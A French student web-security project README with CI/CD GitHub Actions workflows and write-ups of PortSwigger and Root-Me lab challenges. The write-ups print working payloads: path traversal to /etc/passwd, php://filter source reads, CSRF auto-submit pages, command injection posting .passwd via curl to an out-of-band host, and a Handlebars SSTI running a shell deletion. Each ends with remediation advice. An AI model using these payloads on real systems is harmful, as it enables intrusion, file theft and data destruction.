# Projet Sécurité du Web

## Membres du groupe

- LOUNADI Nassim
- DEHIL Sami
- BATISTA Maxime
- COUVIDOU Guillaume

## Repo

[Lien](https://github.com/nassimlnd/ci-cd)

## Screenshots

![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/CD_Success.png)
![Screenshot2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/CI_Success.png)
![Screenshot3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/DockerHub_Image.png)
![Screenshot4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/AllWorkflowsRuns.png)

## CI.yml

```yaml
name: CI

on:
  push:
    branches:
      - main
      - master
  workflow_dispatch:

permissions:
  contents: read
  security-events: write
  actions: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.8", "3.9", "3.10"]

    steps:
      - name: checkout
        uses: actions/checkout@v5

      - name: Python ${{ matrix.python-version }}
        uses: actions/setup-python@v6
        with:
          python-version: ${{ matrix.python-version }}

      - name: dependencies
        run: |
          python -m pip install --upgrade pip
          pip install flake8 pytest

      - name: flake8
        run: |
          flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
          flake8 . --count --exit-zero --statistics

      - name: pytest
        run: pytest tests/

  trivy-scan:
    runs-on: ubuntu-latest

    steps:
      - name: checkout
        uses: actions/checkout@v5

      - name: trivy FS mode
        uses: aquasecurity/trivy-action@0.33.1
        with:
          scan-type: "fs"
          format: "sarif"
          output: "results.sarif"
          severity: "CRITICAL,HIGH"

      - name: upload
        uses: github/codeql-action/upload-sarif@v4
        with:
          sarif_file: results.sarif
```

## CD.yml

```yaml
name: CD

on:
  workflow_run:
    workflows: ["CI"]
    types:
      - completed
    branches:
      - main
      - master

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' }}

    steps:
      - name: checkout
        uses: actions/checkout@v5

      - name: login
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}

      - name: build and push
        id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          file: ./Dockerfile
          push: true
          tags: ${{ secrets.DOCKER_USERNAME }}/ci-cd:latest
```

## Challenges

### 1 | File path traversal, validation of file extension with null byte bypass

[Lien](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

D'après le sujet, on se doute qu'il faut ajouter un null byte (%00) lors de l'appel d'une image.

Ne pas oublier d'ajouter les images dans Burp pour les intercepter :

![Step 0](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/1_file_path_traversal_validation_of_file_extension_with_null_byte_bypass/0.png)

Sur la page d'accueil, on remarque que les images sont chargées via un paramètre 'filename', on peut donc tenter une inclusion de fichier avec un path traversal + null byte :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/1_file_path_traversal_validation_of_file_extension_with_null_byte_bypass/1.png)

Payload :

```bash
../../../../../etc/passwd%00.jpg
```

Pour se protéger contre cette vulnérabilité, il faut empêcher les caractères spéciaux dans les entrées utilisateur, et si possible utiliser une liste blanche pour les fichiers autorisés.

[Source](https://www.chiny.me/null-byte-injection-14-7.php)

[Source](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

### 2 | PHP Filters

[Lien](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters)

Utilisation du filtre 'php://filter/convert' avec base64-encode pour lire le code source PHP depuis l'include via le paramètre 'inc' :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/1.png)

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/2.png)

Même principe pour lire le fichier login :

![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/3.png)

![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/4.png)

On se rend compte de l'existence d'un fichier config.php, on applique la même technique pour le lire :

![Step 5](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/5.png)

![Step 6](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/2_PHP_filters/6.png)

Payload :

```bash
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
```

Pour s'affranchir de cette vulnérabilité, il suffit d'appliquer le principe de "Never trust user input" en validant et en nettoyant les entrées utilisateur avant de les utiliser dans des fonctions sensibles comme include(). Ou simplement ne pas utiliser include() dans ce cas précis.

[Source](https://faun.pub/good-practices-how-to-sanitize-validate-and-escape-in-php-3-methods-719c9fce99d6?gi=fecb20f8fd00)

[Source](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-for-url-contexts)

### 3 | CSRF Contournement de Jeton

[Lien](https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton)

Création d'un compte :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/3_CSRF_contournement_de_jeton/1.png)

Récupération du template du formulaire de profil utilisateur :

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/3_CSRF_contournement_de_jeton/2.png)

Payload :

```html
<html>
  <form
    id="profile"
    action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
    method="post"
    enctype="multipart/form-data"
  >
    <div>
      <label>Username:</label>
      <input id="username" type="text" name="username" value="change_me_user" />
    </div>
    <br />
    <div>
      <label>Status:</label>
      <input id="status" type="checkbox" name="status" checked />
    </div>
    <br />
    <input id="token" type="hidden" name="token" value="" />
    <button type="submit">Submit</button>
  </form>

  <script>
    const request = new XMLHttpRequest();
    request.open(
      "GET",
      "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile",
      false
    );
    request.send();

    const token = request.responseText.match(
      /name="token" value="([a-zA-Z0-9]+)"/
    )[1];

    const tokenField = document.getElementById("token");
    tokenField.setAttribute("value", token);

    const form = document.getElementById("profile");
    form.submit();
  </script>
</html>
```

Attendre le passage de l'administrateur sur la demande de contact :

![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/3_CSRF_contournement_de_jeton/3.png)

Pour empêcher cette vulnérabilité, il est possible d'utiliser une validation au niveau de l'input utilisateur ("Never trust user input").
Comme "DOMPurify.sanitize(payload)".

[Source](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization)

### 4 | CSRF where token is not tied to user session

[Lien](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

Capture de la requête de mise à jour de l'email dans Burp :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/1.png)

On garde le token CSRF de côté.

On va maintenant venir se connecter avec le 2ème compte fourni sur une autre fenêtre en navigation privée pour s'assurer d'être sur une autre session.

On intercepte à nouveau notre requête de mise à jour de l'email avec le nouveau compte :

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/2.png)

Pour s'assurer que le token CSRF n'est pas lié à la session, on va modifier notre requête dans le Repeater de Burp.

![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/3.png)

Ici, on modifie l'email et le token avec celui qu'on a gardé sous le coude un peu plus tôt et on soumet la requête.

![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/4.png)

La requête passe correctement, on peut donc en déduire que le token CSRF n'est pas lié à la session de l'utilisateur.

![Step 5](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/5.png)

Pour résoudre le challenge, on va donc dans "Go to exploit server".

Dans la partie "Body", on applique ce code récupéré depuis la page de mise à jour de l'email :

```html
<html>
  <body>
    <form
      class="login-form"
      name="change-email-form"
      action="https://0a5d00b6043c301280dc030300e8009c.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <label>Email</label>
      <input type="hidden" name="email" value="victime@pwned.com" />
      <input
        type="hidden"
        name="csrf"
        value="HcWGTMjAD6bjaukJQhqU5PYODOZO8Atq"
      />
      <!-- CSRF de l'autre user, non consommé par le serveur -->
      <button type="submit" value="Submit" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![Step 6](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/4_CSRF_where_token_id_not_tied_to_user_session/6.png)

### 5 |

### 6 | JWT Jeton révoqué

[Lien](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque)

Après avoir testé plusieurs payloads, d'avoir changé d'encodage, j'ai finalement essayé de changer le token en lui même (vu que la blacklist l'identifie en dur).

Recherche sur une sorte de null byte en base64 :

[Recherche](https://www.reddit.com/r/ProgrammerTIL/comments/6e6vbu/til_base64_encoded_strings_have_at_the_end_when)

La signature étant tronquée, il est donc possible d'ajouter des caractères "=" après le token si la longueur n'est pas divisible par 3.

Récupération d'un token valide avec l'utilisateur admin :

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/6_JWT_jeton_revoque/1.png)

La signature est tronquée et a pour longueur 43

3 \* 14 = 42

3 \* 15 = 45

Ajout de 1 ou 2 "=" à la fin du token :

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/6_JWT_jeton_revoque/2.png)

Pour se protéger contre cette vulnérabilité, il serait judicieux d'utiliser une bibliothèque officielle pour la gestion des JWT, ou d'utiliser une liste blanche, ou simplement supprimer les "=" des tokens récupérés via les requêtes utilisateur.

[Source](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html#how-to-prevent_3)

### 7 |

### 8 | Injection de commande - Contournement de filtre

[Lien](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)

Il est possible de renseigner un host à ping, on peut donc essayer d'injecter une commande annexe pour l'exécuter sur le serveur cible.

- Mettre un host et submit le formulaire
- Utilisation du repeater de Burp sur la requête POST
- Construction de la commande à executer avec curl et le flag '--data' (envoyer le contenu d'un fichier sur un serveur distant).
- Utilisation d'un serveur Interactsh pour recevoir le contenu du fichier.
- Echapement des espaces avec '%20'
- Essaie de plusiers caractères ASCII encodés pour chainer ([ ;, &, | ])
- Finalement, le caractère '\n' encodé en '%0a' fonctionne.

![Step 1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/8_injection_de_commande_contournement_de_filtre/1.png)

![Step 2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/8_injection_de_commande_contournement_de_filtre/2.png)

Payload :

```bash
google.com%0acurl%20-X%20POST%20axdfenolaqijecgpnjnhl5gur6fexltfl.oast.fun%20--data%20%22%40index.php%22
```

On remarque la présence d'un fichier '.passwd', on applique la même technique pour le récupéré.

![Step 3](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/8_injection_de_commande_contournement_de_filtre/3.png)

![Step 4](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/8_injection_de_commande_contournement_de_filtre/4.png)

Payload :

```bash
google.com%0acurl%20-X%20POST%20dxmvjgheeljbwmrmldrddmlkzc5ijlcrj.oast.fun%20--data%20%22%40.passwd%22
```

Pour se protéger contre cette vulnérabilité, il faudrait améliorer le filtrage, et / ou utiliser des fonctions sécurisées native du langage pour exécuter des commandes systèmes.

[Source](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#primary-defenses)

### 9 |

### 10 | Server-Side Template Injection (SSTI)

[Lien](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

Le SSTI (Server-Side Template Injection) est une vulnérabilité qui permet d'injecter du code malveillant dans un moteur de templates côté serveur. Si les entrées utilisateur ne sont pas correctement validées, on peut exécuter du code arbitraire sur le serveur.

#### Step 1 : Identification de la vulnérabilité

En cliquant sur "View details" d'un produit, on remarque que le message "Unfortunately this product is out of stock" est affiché via le paramètre `message` dans l'URL :

```
?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```

Pour tester si le site est vulnérable au SSTI, on injecte une chaîne de fuzzing contenant différentes syntaxes de templates :

```
?message=${{<%[%'"}}%\
```

Un message d'erreur apparaît, confirmant la vulnérabilité SSTI.

#### Step 2 : Identification du moteur de templates

En analysant les messages d'erreur et en testant différentes syntaxes, on identifie que le moteur utilisé est **Handlebars** (Node.js).

Syntaxe Handlebars :
```handlebars
{{expression}}
{{#with variable}}...{{/with}}
```

#### Step 3 : Recherche d'un exploit

En recherchant "Handlebars SSTI exploit", on trouve un exploit connu qui permet d'exécuter des commandes système en manipulant les fonctions internes de JavaScript.

L'exploit utilise :
- `lookup string.sub "constructor"` pour accéder au constructeur de Function
- `require('child_process')` pour exécuter des commandes système

#### Step 4 : Construction du payload

Le payload exploite les blocs `{{#with}}` de Handlebars pour créer une fonction malveillante qui supprime le fichier `/home/carlos/morale.txt` :

Payload (non encodé) :
```handlebars
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Step 5 : Exécution de l'exploit

On envoie le payload URL-encodé dans le paramètre `message`. Le serveur interprète le template Handlebars, exécute le code JavaScript côté serveur, et la commande `rm /home/carlos/morale.txt` est lancée.

Le fichier est supprimé avec succès et le challenge est validé.

#### Remédiation

Pour se protéger contre les vulnérabilités SSTI :

1. **Ne jamais concaténer les entrées utilisateur dans les templates** : Utiliser uniquement des variables de contexte
2. **Valider et sanitiser toutes les entrées** : Bloquer les patterns dangereux (`{{`, `constructor`, `require`, etc.)
3. **Utiliser un mode sandbox** : Limiter l'accès aux fonctionnalités dangereuses du moteur de templates
4. **Désactiver les helpers dangereux** : Supprimer ou restreindre `with`, `each`, `lookup`
5. **Utiliser des templates statiques pré-compilés** : Éviter la compilation dynamique basée sur les entrées utilisateur

#### Screenshots
![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/10_ssti/challenge_success.png)


[Source OWASP - SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)

### 11 | Mass Assignment

[Lien](https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment)

Le Mass Assignment est une vulnérabilité qui survient lorsqu'une application permet la modification de propriétés d'objets qui ne devraient pas être modifiables par l'utilisateur (comme le rôle ou les permissions).

#### Step 1 : Création du compte et authentification

Il faut créer un compte et se connecter

```http request
POST /api/signup HTTP/1.1
Host: challenge01.root-me.org:59090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org:59090/
Content-Type: application/json
Content-Length: 43
Origin: http://challenge01.root-me.org:59090
Connection: keep-alive
Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117
Priority: u=0

{
  "username": "xx",
  "password": "123"
}
```

```http request
POST /api/login HTTP/1.1
Host: challenge01.root-me.org:59090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org:59090/
Content-Type: application/json
Content-Length: 43
Origin: http://challenge01.root-me.org:59090
Connection: keep-alive
Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117
Priority: u=0

{
  "username": "xx",
  "password": "123"
}
```

#### Step 2 : Récupération des informations utilisateur

Récupérons les informations de notre utilisateur via l'endpoint `/api/user` et envoyons la requête dans le Repeater de Burp.

```http request
GET /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org:59090/
Connection: keep-alive
Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
Priority: u=0
```

La réponse :
```http request
HTTP/1.1 200 OK
Server: Werkzeug/3.0.5 Python/3.11.10
Date: Wed, 03 Dec 2025 08:55:04 GMT
Content-Type: application/json
Content-Length: 56
Access-Control-Allow-Origin: *
Vary: Cookie
Connection: close

{
    "note": "",
    "status": "guest",
    "userid": 3,
    "username": "xx"
}
```

On constate que notre utilisateur a le statut `guest`.

#### Step 3 : Énumération des méthodes HTTP disponibles

Pour identifier les méthodes HTTP disponibles sur l'endpoint `/api/user`, utilisons la méthode `OPTIONS` :

```http request
OPTIONS /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org:59090/
Connection: keep-alive
Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
Priority: u=0
```

Réponse :

```http request
HTTP/1.1 200 OK
Allow: OPTIONS, GET, PUT
```

On découvre que les méthodes `OPTIONS`, `GET` et `PUT` sont disponibles. La méthode `PUT` est généralement utilisée pour mettre à jour une ressource sur un serveur, ce qui nous permet d'exploiter la vulnérabilité.

#### Step 4 : Exploitation de la vulnérabilité Mass Assignment

On va tenter de modifier notre statut pour obtenir le rôle `admin` en envoyant une requête `PUT` sur l'endpoint `/api/user` :

```http request
PUT /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org:59090/
Connection: keep-alive
Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
Priority: u=0
Content-Length: 25
Content-Type: application/json

{
  "status": "admin"
}
```

Réponse :

```json
{"message":"User updated sucessfully."}
```

La méthode `PUT` sur l'endpoint `/api/user` n'est pas protégée. Nous avons donc pu mettre à jour le rôle de notre utilisateur pour devenir admin sans aucune vérification.

#### Step 5 : Validation de l'élévation de privilèges

Vérifions que nous avons bien obtenu les droits administrateur en récupérant le flag sur l'endpoint `/api/flag` qui est protégé et accessible uniquement aux administrateurs :

```http request
GET /api/flag HTTP/1.1
Host: challenge01.root-me.org:59090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org:59090/
Connection: keep-alive
Cookie: _ga_SRYSKX09J7=GS2.1.s1764690117$o1$g1$t1764690135$j42$l0$h0; _ga=GA1.1.218428265.1764690117; session=.eJwlzj0OwjAMQOG7ZGYwie3YvQyK_wRrSyfE3anE-Kb3fdqj9jyebXvvZ97a4xVta-rETHdF8OHIMjlNAYTcgBCFpkFYz67LK4ymS4GV8gCL4qVcnTxCB4pY-lKjmk5G5tknheSSEo4hOVyugh4xF8K1Q8F2Qc4j979mtO8P2kowJg.aS_60Q.iAIQrAL0_uhVZoSdCkz7qB2v56U
Priority: u=0
```

Réponse :

```json
{"message":"Hello admin, here is the flag : RM{4lw4yS_ch3ck_0pt10ns_m3th0d}."}
```

Nous avons confirmé notre statut d'administrateur et récupéré le flag avec succès.

#### Remédiation

Pour se protéger contre cette vulnérabilité Mass Assignment :

1. **Whitelist explicite** : N'autoriser que les champs modifiables par l'utilisateur (ex: `username`, `note`) et interdire explicitement les champs sensibles (`status`, `role`, `is_admin`)
2. **Validation côté serveur** : Vérifier systématiquement les permissions avant toute modification de propriété sensible
3. **DTOs (Data Transfer Objects)** : Utiliser des objets dédiés pour limiter les champs exposés dans l'API
4. **Principe du moindre privilège** : Ne jamais faire confiance aux données utilisateur sans validation

[Source OWASP - Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

#### Screenshots
![Screenshot1](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/11_mass_assignment/challenge_success.png)
![Screenshot2](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/11_mass_assignment/endpoint.png)

